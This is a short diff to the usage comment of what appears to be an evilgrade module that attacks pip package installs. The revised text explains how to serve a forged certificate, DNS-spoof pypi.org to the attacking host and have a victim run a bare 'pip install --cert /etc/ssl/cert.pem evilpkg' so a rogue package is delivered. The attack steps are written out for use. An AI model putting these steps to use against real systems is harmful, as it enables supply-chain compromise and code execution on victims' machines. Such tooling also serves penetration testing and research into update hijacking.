@@ -23,10 +23,11 @@
 #
 # Homebrew's python and pip's default certifi are NOT affected.
 #
-# Use with: set sslcert certs/emudhra_mitm, DNS-spoof pypi.org (and
-# files.pythonhosted.org) to this host, then on the victim:
-#   /usr/bin/python3 -m pip install --cert /etc/ssl/cert.pem \
-#       --index-url https://pypi.org/simple/ evilpkg
+# Use with: set sslport 443, set sslcert certs/emudhra_mitm, enable + start
+# (the DNS server answers pypi.org automatically from this vh). Then the victim
+# runs a BARE pip install -- pip's default index is https://pypi.org/simple, so
+# no --index-url is needed once DNS points pypi.org at evilgrade:
+#   /usr/bin/python3 -m pip install --cert /etc/ssl/cert.pem evilpkg
 #
 # The index uses a RELATIVE href so the sdist is served from the same host as
 # the index -- no second (files.pythonhosted.org) origin needed.
